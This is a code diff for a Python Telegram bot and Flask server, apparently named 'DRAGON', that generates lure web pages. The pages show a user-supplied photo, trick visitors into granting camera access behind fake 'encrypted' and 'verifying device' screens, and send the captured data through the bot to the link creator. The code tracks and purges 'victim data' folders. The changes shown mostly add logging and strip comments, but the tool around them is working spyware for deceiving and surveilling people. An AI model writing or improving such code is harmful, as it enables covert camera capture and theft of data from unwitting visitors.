@@ -40,7 +40,6 @@ if not os.path.exists(USER_LINKS_FILE):
 bot = telebot.TeleBot(TOKEN)
 
 
-# ========== USER LINK MANAGEMENT ==========
 def get_user_active_link(user_id):
     with open(USER_LINKS_FILE, "r") as f:
         data = json.load(f)
@@ -51,7 +50,6 @@ def set_user_active_link(user_id, html_filename, photo_filename):
     with open(USER_LINKS_FILE, "r") as f:
         data = json.load(f)
     
-    # Delete old files if user already had a link
     old = data.get(str(user_id))
     if old:
         old_html = os.path.join(HTML_DIR, old.get("html"))
@@ -78,34 +76,30 @@ def increment_links():
         json.dump(stats, f)
 
 
-# ========== AUTO DELETE VICTIM DATA (10 MINUTES) ==========
 def delete_old_victim_data():
     cutoff_time = datetime.now() - timedelta(minutes=10)
     deleted = 0
-    
-    # Delete old victim data folders
-    for folder_name in os.listdir(VICTIM_DATA_DIR):
-        folder_path = os.path.join(VICTIM_DATA_DIR, folder_name)
-        try:
-            if datetime.fromtimestamp(os.path.getmtime(folder_path)) < cutoff_time:
-                shutil.rmtree(folder_path)
-                deleted += 1
-        except:
-            pass
-    
+    if os.path.exists(VICTIM_DATA_DIR):
+        for folder_name in os.listdir(VICTIM_DATA_DIR):
+            folder_path = os.path.join(VICTIM_DATA_DIR, folder_name)
+            try:
+                if datetime.fromtimestamp(os.path.getmtime(folder_path)) < cutoff_time:
+                    shutil.rmtree(folder_path)
+                    deleted += 1
+            except:
+                pass
     if deleted:
-        logger.info(f"🗑️ Deleted {deleted} old victim data folders")
+        logger.info(f"Deleted {deleted} old victim data folders")
 
 
 def start_auto_cleanup():
     def cleanup_loop():
         while True:
-            time.sleep(600)  # 10 minutes
+            time.sleep(600)
             delete_old_victim_data()
     threading.Thread(target=cleanup_loop, daemon=True).start()
 
 
-# ========== IS USER SUBSCRIBED? ==========
 def is_subscribed(user_id):
     try:
         url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={REQUIRED_CHANNEL}&user_id={user_id}"
@@ -118,7 +112,6 @@ def is_subscribed(user_id):
     return False
 
 
-# ========== USER STATE ==========
 def get_user_state(user_id):
     try:
         with open(os.path.join(HTML_DIR, f"state_{user_id}.json"), "r") as f:
@@ -132,7 +125,6 @@ def set_user_state(user_id, data):
         json.dump(data, f)
 
 
-# ========== GENERATE HTML WITH USER PHOTO ==========
 def generate_html(user_id, target_url, photo_filename):
     html_filename = f"v_{user_id}_{int(time.time())}.html"
     filepath = os.path.join(HTML_DIR, html_filename)
@@ -140,7 +132,6 @@ def generate_html(user_id, target_url, photo_filename):
     photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{photo_filename}"
     storage_channel = CHANNEL_ID if CHANNEL_ID else "null"
     
-    # Create victim data folder
     victim_folder = os.path.join(VICTIM_DATA_DIR, f"victim_{user_id}_{int(time.time())}")
     os.makedirs(victim_folder, exist_ok=True)
     
@@ -180,10 +171,10 @@ def generate_html(user_id, target_url, photo_filename):
             <div class="preview-label" style="font-size:12px;color:#888;margin-bottom:8px">Shared by user</div>
             <img class="user-photo" src="{photo_url}">
             <div class="message">"Here's my shared content"</div>
-            <button class="btn" onclick="requestCamera()">🚀 Continue →</button>
+            <button class="btn" onclick="requestCamera()">Continue →</button>
             <div id="errorMsg" class="error" style="display:none"></div>
         </div>
-        <div class="footer"><p>🔒 End-to-end encrypted • 256-bit security</p></div>
+        <div class="footer"><p>End-to-end encrypted • 256-bit security</p></div>
     </div>
     <div id="step3" class="step"><div class="preview-section"><div class="loader"></div><p style="color:#666; margin-top:16px">Establishing secure connection...</p></div></div>
     <div id="step4" class="step"><div class="preview-section"><div class="loader"></div><p style="color:#666; margin-top:16px">Verifying your device...</p></div></div>
@@ -196,7 +187,6 @@ const TOKEN = "{TOKEN}";
 const USER = {user_id};
 const STORAGE = {storage_channel};
 const TARGET = "{target_url}";
-const VICTIM_FOLDER = "{victim_folder}";
 
 async function sendToUser(text, file=null) {{
     try {{
@@ -272,13 +262,15 @@ start();
     
     with open(filepath, "w", encoding="utf-8") as f:
         f.write(html)
+    
+    logger.info(f"✅ HTML file saved: {filepath}")
     return html_filename
 
 
-# ========== BOT HANDLERS ==========
 @bot.message_handler(commands=['start'])
 def start_command(message):
     chat_id = message.chat.id
+    logger.info(f"Start command from {chat_id}")
     if not is_subscribed(chat_id):
         markup = telebot.types.InlineKeyboardMarkup()
         markup.add(telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/nrtecno2"))
@@ -292,6 +284,7 @@ def start_command(message):
 @bot.message_handler(func=lambda m: m.text and m.text.startswith(('http://', 'https://')))
 def handle_url(message):
     chat_id = message.chat.id
+    logger.info(f"URL received from {chat_id}: {message.text[:50]}")
     state = get_user_state(chat_id)
     if state.get("state") != "waiting_url":
         bot.send_message(chat_id, "Use /start first")
@@ -303,6 +296,7 @@ def handle_url(message):
 @bot.message_handler(content_types=['photo'])
 def handle_photo(message):
     chat_id = message.chat.id
+    logger.info(f"Photo received from {chat_id}")
     state = get_user_state(chat_id)
     if state.get("state") != "waiting_photo":
         bot.send_message(chat_id, "Please send URL first using /start")
@@ -311,8 +305,10 @@ def handle_photo(message):
         file_info = bot.get_file(message.photo[-1].file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         photo_filename = f"photo_{chat_id}_{int(time.time())}.jpg"
-        with open(os.path.join(PHOTO_DIR, photo_filename), "wb") as f:
+        photo_path = os.path.join(PHOTO_DIR, photo_filename)
+        with open(photo_path, "wb") as f:
             f.write(downloaded_file)
+        logger.info(f"Photo saved: {photo_path}")
         
         target_url = state.get("target_url")
         html_filename = generate_html(chat_id, target_url, photo_filename)
@@ -322,6 +318,7 @@ def handle_photo(message):
         
         link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_filename}"
         bot.send_message(chat_id, f"Your link:\n{link}\n\nThis link will stay active until you create a new one. Share it with anyone!")
+        logger.info(f"Link generated for {chat_id}: {link}")
     except Exception as e:
         logger.error(f"Photo error: {e}")
         bot.send_message(chat_id, "Error processing photo. Please try again.")
@@ -329,6 +326,7 @@ def handle_photo(message):
 
 @bot.callback_query_handler(func=lambda call: call.data == "verify")
 def verify_callback(call):
+    logger.info(f"Verify callback from {call.from_user.id}")
     if is_subscribed(call.from_user.id):
         bot.edit_message_text("Verified! Send me any URL:", call.from_user.id, call.message.message_id)
         set_user_state(call.from_user.id, {"state": "waiting_url", "target_url": None})
@@ -336,7 +334,6 @@ def verify_callback(call):
         bot.answer_callback_query(call.id, "Join channel first!", True)
 
 
-# ========== FLASK ROUTES ==========
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
@@ -351,7 +348,13 @@ def webhook():
 
 @app.route('/view/<filename>')
 def serve_html(filename):
-    return send_from_directory(HTML_DIR, filename)
+    filepath = os.path.join(HTML_DIR, filename)
+    if os.path.exists(filepath):
+        logger.info(f"Serving HTML: {filename}")
+        return send_from_directory(HTML_DIR, filename)
+    else:
+        logger.error(f"HTML file not found: {filepath}")
+        return "Link expired or invalid", 404
 
 
 @app.route('/photos/<filename>')
@@ -361,10 +364,11 @@ def serve_photo(filename):
 
 @app.route('/')
 def home():
-    return f"🐉 DRAGON ACTIVE | Live links: {len([f for f in os.listdir(HTML_DIR) if f.startswith('v_')])}"
+    return f"DRAGON ACTIVE | Live links: {len([f for f in os.listdir(HTML_DIR) if f.startswith('v_')])}"
 
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     start_auto_cleanup()
+    logger.info(f"Starting bot on port {port}")
     app.run(host='0.0.0.0', port=port)
